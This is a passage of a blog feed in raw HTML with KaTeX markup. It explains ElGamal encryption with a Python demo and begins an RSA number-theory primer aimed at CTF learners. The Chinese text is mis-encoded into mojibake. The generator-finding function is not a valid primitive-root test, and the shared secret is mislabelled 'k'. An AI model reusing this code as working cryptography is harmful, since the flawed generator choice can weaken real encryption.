xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mtext>ï¼Œ</mtext><mi>p</mi><mtext>ï¼Œ</mtext><mi>g</mi><mtext>ï¼Œ</mtext><mi>y</mi></mrow><annotation encoding="application/x-tex">{Gï¼Œpï¼Œgï¼Œy}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></span>}ç»™Aå‘é€æ¶ˆæ¯ï¼š</p><ul><li>ç”¨æˆ·Bè¦å‘é€æ¶ˆæ¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>ç»™Aï¼Œå…ˆå°†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>æ˜ å°„åˆ°å¾ªç¯ç¾¤<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span>ä¸­å¾—åˆ°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span></li><li>Bä»<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>2</mn><mo separator="true">,</mo><mi>p</mi><mo>âˆ’</mo><mn>2</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[2,p-2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">]</span></span></span></span>ä¸­éšæœºé€‰æ‹©ä¸€ä¸ª<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>ï¼Œè®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>g</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">c_1=g^k\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>Bè®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mo>âˆ—</mo><msup><mi>y</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">c_2=m*y^k\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>å‘é€å¯†æ–‡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>c</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(c_1,c_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>ç»™A</li></ul><h2 id="è§£å¯†">è§£å¯†</h2><p>Aæ‹¿åˆ°Bå‘é€è¿‡æ¥çš„å¯†æ–‡ä¹‹å</p><ul><li>è®¡ç®—Bä½¿ç”¨çš„å¯†é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><msubsup><mi>c</mi><mn>1</mn><mi>x</mi></msubsup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">k=c_1^x\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9125em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li><li>ç”±äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>æ˜¯åœ¨å¾ªç¯ç¾¤å†…é€‰å–çš„ï¼Œæ‰€å¯ä»¥è®¡ç®—å‡ºé€†å…ƒ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">k^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span></li><li>è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><msub><mi>c</mi><mn>2</mn></msub><mo>âˆ—</mo><msup><mi>k</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">m=c_2*k^{-1}\mod{p}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6153em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span></li></ul><p>pythonå®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">e_gcd</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> a, <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>    g, x, y = e_gcd(b, a%b)<br>    <span class="hljs-keyword">return</span> g, y, x-a//b*y  <span class="hljs-comment">#1.gcd 2.a^-1 mod b 3.b^-1 mod a</span><br><br><span class="hljs-comment">#æ±‚æœ€å°åŸæ ¹</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_generator</span>(<span class="hljs-params">n</span>):<br>    k=(n-<span class="hljs-number">1</span>)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,n-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> multimod(i,k,n)!=<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> i<br>        <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">multimod</span>(<span class="hljs-params">a,k,n</span>):    <span class="hljs-comment">#å¿«é€Ÿå¹‚å–æ¨¡</span><br>    ans=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(k!=<span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">if</span> k&amp;<span class="hljs-number">1</span>:<br>            ans = (ans * a) % n<br>        a=(a*a)%n<br>        k=k&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> ans<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">m, p, y,g</span>):<br>    k = random.randint(<span class="hljs-number">1</span>, p - <span class="hljs-number">1</span>)<br>    C1=multimod(g,k,p)<span class="hljs-comment"># c1=g^k%p</span><br>    <span class="hljs-comment">#è®¡ç®—m*y^k %p</span><br>    C2=(m*multimod(y,k,p)) % p<br>    <span class="hljs-keyword">return</span> C1,C2,k<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">C1, C2, x,p</span>):<br>    s = multimod(C1,x,p)<br>    s_ = e_gcd(s, p)[<span class="hljs-number">1</span>]<br>    m = C2*s_ % p<br>    <span class="hljs-keyword">return</span> m<br><span class="hljs-comment"># Driver code</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    m = <span class="hljs-string">&#x27;1234567&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ˜æ–‡ :&quot;</span>, m)<br><br>    p = getPrime(<span class="hljs-number">512</span>)<br>    x = random.randint(<span class="hljs-number">1</span>, p-<span class="hljs-number">1</span>)<span class="hljs-comment">#ç§é’¥</span><br><br>    g = get_generator(p)<br>    y = multimod(g, x, p)<span class="hljs-comment">#å…¬é’¥</span><br><br><br>    C1, C2, k = encrypt(<span class="hljs-built_in">int</span>(m), p, y, g)<br>    m_ = decrypt(C1, C2, x, p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†åæ˜æ–‡ :&quot;</span>, m_)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=&#x27;</span>+<span class="hljs-built_in">str</span>(p))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;g=&#x27;</span>+<span class="hljs-built_in">str</span>(g))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;x=&#x27;</span>+<span class="hljs-built_in">str</span>(x))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;k=&#x27;</span>+<span class="hljs-built_in">str</span>(k))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;å¯†æ–‡ï¼šC1=&#x27;</span>+<span class="hljs-built_in">str</span>(C1))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;C2=&#x27;</span>+<span class="hljs-built_in">str</span>(C2))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æœ‰å…³rsa</title>
    <link href="/2023/05/14/%E6%9C%89%E5%85%B3rsa/"/>
    <url>/2023/05/14/%E6%9C%89%E5%85%B3rsa/</url>
    
    <content type="html"><![CDATA[<h1 id="RsaåŸºç¡€çŸ¥è¯†">RsaåŸºç¡€çŸ¥è¯†</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">rsaæ˜¯ç»å¸¸å‡ºç°åœ¨ctfè€ƒé¢˜ä¸­çš„ä¸€ç±»é¢˜ï¼Œå®ƒæ˜¯åŸºäºå¤§ç´ å› æ•°åˆ†è§£éš¾é¢˜äº§ç”Ÿçš„å…¬é’¥å¯†ç <br></code></pre></td></tr></table></figure><h2 id="æ•°å­¦åŸºç¡€">æ•°å­¦åŸºç¡€</h2><h3 id="ç´ æ•°">ç´ æ•°</h3><p>ç´ æ•°åˆå«è´¨æ•°ï¼Œé™¤äº†1å’Œå…¶æœ¬èº«ï¼Œä¸èƒ½è¢«å…¶ä»–æ•°æ•´é™¤çš„æ•°å«åšç´ æ•°</p><h3 id="æ¨¡è¿ç®—">æ¨¡è¿ç®—</h3><p>æ¨¡è¿ç®—æ˜¯å–ä½™è¿ç®—ï¼Œå…¶ç¬¦å·ä¸º<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">mod</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span></span></span></span></p><h3 id="åŒä½™">åŒä½™</h3><p>ä¸¤ä¸ªæ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> å¯¹åŒä¸€ä¸ªæ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>å–ä½™ç»“æœç›¸åŒï¼Œåˆ™ç§°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>ä¸<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span>æ¨¡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>åŒä½™</p><h3 id="äº’è´¨">äº’è´¨</h3><p>å½“ä¸¤ä¸ªæ­£æ•´æ•°é™¤äº†1ä¹‹å¤–æ²¡æœ‰å…¶ä»–å…¬å› å­ï¼Œæˆ‘ä»¬å°±ç§°è¿™ä¸¤ä¸ªæ•°äº’è´¨</p><p>ä»»æ„ä¸¤ä¸ªè´¨æ•°ä¸€å®šäº’è´¨</p><h3 id="æ¬§æ‹‰å‡½æ•°">æ¬§æ‹‰å‡½æ•°</h3><p>æ•°è®ºä¸­ï¼Œå¯¹æ­£æ•´æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ï¼Œæ¬§æ‹‰å‡½æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï†</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>æŒ‡çš„æ˜¯å°äºæˆ–ç­‰äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>çš„æ­£æ•´æ•°ä¸­ä¸<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>äº’è´¨çš„æ•°</p><p>æ˜“çŸ¥è´¨æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>çš„æ¬§æ‹‰å‡½æ•°æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p><p>è‹¥ä¸æ˜¯è´¨æ•°ï¼Œå…¶æ¬§æ‹‰å‡½æ•°æœ‰å…¬å¼ï¼š</p><h3 id="æ¬§æ‹‰å®šç†">æ¬§æ‹‰å®šç†</h3><p>è‹¥ä¸¤ä¸ªæ­£æ•´æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mtext>Â </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">a,\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>äº’è´¨ï¼Œåˆ™å¦‚ä¸‹ç­‰å¼æˆç«‹</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>a</mi><mrow><mi>Ï†</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>â‰¡</mo><mn>1</mn><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">a^{\varphi(n)}\equiv1\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.938em;"></span><span 